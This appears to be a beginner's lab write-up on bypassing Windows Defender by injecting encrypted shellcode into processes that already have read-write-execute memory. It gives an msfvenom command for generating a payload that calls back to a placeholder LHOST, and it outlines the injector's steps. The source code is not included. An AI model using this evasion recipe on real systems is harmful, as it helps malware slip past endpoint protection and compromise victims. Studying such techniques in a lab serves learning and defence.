### Introduction

So I don't know why, but i've done some malware analysis (still a noob btw), i've also tried some malware development(still a noob btw) in an environment 
where windows defender was always disabled and i've never tried bypassing it. So I decided to start with something simple.
I started with a simple google search...How to bypass windows defender and i stumbled on 2 blog post, one was related to Loki C2 and the 
other with injecting shellcode inside a process that already had READ,WRITE AND EXECUTE memory sections.

And before you say it, yes, i know, it's already a known fact, it's easy to bypass windows...but to do it yourself is still learning. It's one thing
to just take a working code and just run it, but it's another thing to take the code understand it and modify it to the way you like.
That's why i learned reverse engineering, because you need to be able to understand the inner workings of anything you touch. I think
that's what make the difference between people in this field!

I guess you already know which one I chose to start with, i chose latter.
Here's the blog I used as a reference : https://medium.com/@s12deff/bypass-windows-defender-executing-shellcode-using-freeloaderinjector-7deeba8796e2
In that blog he use the undocumented API : `ntdll.dll`. I didn't want to just copy and paste it, so i adapted is code to use it with the documented API
and I removed unnecessary stuff, which provided me a good practice and refresher.


### Setup

- Kali VM
- Windows 10 VM
- Visual Studio
- Metasploit
- Your Head
- ChatGPT (for reference of course😆)


### Walkthrough

1. So first, I started by generating a shellcode with msfvenom : `msfvenom -p <PAYLOAD> LHOST=<YOUR_IP> LPORT=<PORT> -f c > <NAME>.c`
2. Encrypt the payloadm I have an encryptor program that i used, you can find it on my Github (you can create your own too) : `Crypter`
3. The main program will
    - Get an handle on each processes and duplicate them (for future implementations i duplicate them, to be able to perform additionnal executions)
    - Check if the process has RWX memory section and get that address in memory
    - Decrypt the payload and inject it into that section
4. Build the executable as Release and upload it to your windows vm

![POC](poc.png)

### Conclusion

I think, that next i want to either try a dll sideloading and then move on to using Loki with electron apps that also uses dll sideloading attacks,
there's a good write-up on it [here](https://www.ibm.com/think/x-force/bypassing-windows-defender-application-control-loki-c2), if you want to take a head start!

